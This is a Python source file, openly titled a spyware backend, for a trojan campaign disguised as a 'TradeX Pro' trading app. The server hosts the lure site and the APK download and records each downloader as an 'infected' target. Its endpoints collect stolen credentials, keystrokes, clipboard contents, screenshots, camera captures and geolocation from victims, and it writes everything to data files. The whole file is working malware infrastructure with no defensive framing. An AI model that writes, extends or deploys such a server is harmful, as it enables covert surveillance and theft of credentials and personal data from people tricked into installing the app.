#!/usr/bin/env python3
"""
TradeX Pro - Spyware Backend Server
Captures credentials, keylog, clipboard, screen, mouse movements
"""
import http.server
import json
import os
import time
from datetime import datetime
from urllib.parse import urlparse

# Data storage
data_store = {
    "credentials": [],
    "keylog": [],
    "clipboard": [],
    "screen": [],
    "mouse": [],
    "visibility": [],
    "exits": [],
    "sessions": [],
    "geolocation": [],
    "camera": [],
    "downloads": [],
    "targets": {}
}

# Session tracking
session_counter = 0

class TrojanHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global session_counter
        session_counter += 1
        session_id = f"sess_{session_counter}_{int(time.time())}"
        
        # Track session
        data_store["sessions"].append({
            "session_id": session_id,
            "path": self.path,
            "timestamp": datetime.now().isoformat(),
            "user_agent": self.headers.get("User-Agent", "Unknown"),
            "ip": self.client_address[0]
        })
        
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
        elif self.path == "/css/style.css":
            self.send_response(200)
            self.send_header("Content-type", "text/css")
            self.end_headers()
            with open("css/style.css", "rb") as f:
                self.wfile.write(f.read())
        elif self.path.startswith("/js/"):
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()
            with open(self.path[1:], "rb") as f:
                self.wfile.write(f.read())
        elif self.path.startswith("/assets/"):
            # Serve APK and other assets
            if self.path.endswith(".apk"):
                # Track APK download
                data_store["downloads"].append({
                    "file": "tradex-pro.apk",
                    "session_id": session_id,
                    "timestamp": datetime.now().isoformat(),
                    "ip": self.client_address[0],
                    "user_agent": self.headers.get("User-Agent", "Unknown")
                })
                # Add to targets
                target_id = f"target_{len(data_store['targets']) + 1}"
                data_store["targets"][target_id] = {
                    "session_id": session_id,
                    "ip": self.client_address[0],
                    "user_agent": self.headers.get("User-Agent", "Unknown"),
                    "downloaded_at": datetime.now().isoformat(),
                    "status": "infected"
                }
            self.send_response(200)
            if self.path.endswith(".apk"):
                self.send_header("Content-type", "application/vnd.android.package-archive")
            elif self.path.endswith(".svg"):
                self.send_header("Content-type", "image/svg+xml")
            elif self.path.endswith(".png") or self.path.endswith(".jpg") or self.path.endswith(".gif"):
                self.send_header("Content-type", "image/png")
            else:
                self.send_header("Content-type", "application/octet-stream")
            self.end_headers()
            try:
                with open(self.path[1:], "rb") as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        elif self.path == "/status":
            # Return status of all targets
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "total_sessions": len(data_store["sessions"]),
                "total_downloads": len(data_store["downloads"]),
                "total_credentials": len(data_store["credentials"]),
                "total_keylog": len(data_store["keylog"]),
                "total_clipboard": len(data_store["clipboard"]),
                "total_screens": len(data_store["screen"]),
                "total_geolocation": len(data_store["geolocation"]),
                "total_camera": len(data_store["camera"]),
                "targets": data_store["targets"],
                "downloads": data_store["downloads"]
            }).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        if self.path == "/collect":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["credentials"].append(data)
            self.save_data()
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "captured"}).encode())
            
        elif self.path == "/keylog":
            data = json.loads(body)
            data_store["keylog"].extend(data.get("keys", []))
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/clipboard":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["clipboard"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/screen":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["screen"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/mouse":
            data = json.loads(body)
            data_store["mouse"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/visibility":
            data = json.loads(body)
            data["timestamp"] = datetime.now().isoformat()
            data_store["visibility"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/exit":
            data = json.loads(body)
            data["exit_time"] = datetime.now().isoformat()
            data_store["exits"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/geolocation":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["geolocation"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/camera":
            # Handle multipart form data for camera
            content_type = self.headers.get("Content-Type", "")
            if "multipart/form-data" in content_type:
                # Read boundary
                boundary = content_type.split("boundary=")[1]
                body = self.rfile.read(content_length)
                
                # Parse form data
                parts = body.split(f"--{boundary}".encode())
                camera_data = {}
                for part in parts[1:-1]:  # Skip first and last empty parts
                    if b"filename=" in part:
                        filename = part.split(b"filename=")[1].split(b'"')[1]
                        camera_data["filename"] = filename.decode()
                    elif b"Content-Disposition" in part and b"name=\"timestamp\"" in part:
                        timestamp = part.split(b"\r\n\r\n")[1].strip().decode()
                        camera_data["timestamp"] = timestamp
                    elif b"Content-Disposition" in part and b"name=\"camera\"" in part:
                        camera = part.split(b"\r\n\r\n")[1].strip().decode()
                        camera_data["camera"] = camera
                    elif b"Content-Disposition" in part and b"name=\"resolution\"" in part:
                        resolution = part.split(b"\r\n\r\n")[1].strip().decode()
                        camera_data["resolution"] = resolution
                    elif b"Content-Disposition" in part and b"name=\"geo\"" in part:
                        geo = part.split(b"\r\n\r\n")[1].strip().decode()
                        camera_data["geo"] = geo
                
                camera_data["captured_at"] = datetime.now().isoformat()
                camera_data["session_id"] = session_id
                camera_data["ip"] = self.client_address[0]
                data_store["camera"].append(camera_data)
                self.save_data()
            else:
                data = json.loads(body)
                data["captured_at"] = datetime.now().isoformat()
                data_store["camera"].append(data)
                self.save_data()
            self.send_response(200)
            self.end_headers()
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")
    
    def save_data(self):
        """Save all captured data to files"""
        os.makedirs("data", exist_ok=True)
        
        if data_store["credentials"]:
            with open("data/credentials.json", "w") as f:
                json.dump(data_store["credentials"], f, indent=2)
        
        if data_store["keylog"]:
            with open("data/keylog.json", "w") as f:
                json.dump(data_store["keylog"], f, indent=2)
        
        if data_store["clipboard"]:
            with open("data/clipboard.json", "w") as f:
                json.dump(data_store["clipboard"], f, indent=2)
        
        if data_store["screen"]:
            with open("data/screen.json", "w") as f:
                json.dump(data_store["screen"], f, indent=2)
        
        if data_store["mouse"]:
            with open("data/mouse.json", "w") as f:
                json.dump(data_store["mouse"], f, indent=2)
        
        if data_store["visibility"]:
            with open("data/visibility.json", "w") as f:
                json.dump(data_store["visibility"], f, indent=2)
        
        if data_store["exits"]:
            with open("data/exits.json", "w") as f:
                json.dump(data_store["exits"], f, indent=2)
        
        if data_store["geolocation"]:
            with open("data/geolocation.json", "w") as f:
                json.dump(data_store["geolocation"], f, indent=2)
        
        if data_store["camera"]:
            with open("data/camera.json", "w") as f:
                json.dump(data_store["camera"], f, indent=2)
        
        if data_store["downloads"]:
            with open("data/downloads.json", "w") as f:
                json.dump(data_store["downloads"], f, indent=2)
        
        if data_store["targets"]:
            with open("data/targets.json", "w") as f:
                json.dump(data_store["targets"], f, indent=2)
        
        if data_store["sessions"]:
            with open("data/sessions.json", "w") as f:
                json.dump(data_store["sessions"], f, indent=2)
    
    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")

if __name__ == "__main__":
    PORT = int(os.environ.get("PORT", 9000))
    server = http.server.HTTPServer(("0.0.0.0", PORT), TrojanHandler)
    print(f"🦇 TradeX Pro Spyware Server running on port {PORT}")
    print(f"📊 Data stored in: data/")
    print(f"🔍 Monitor: http://localhost:{PORT}")
    server.serve_forever()
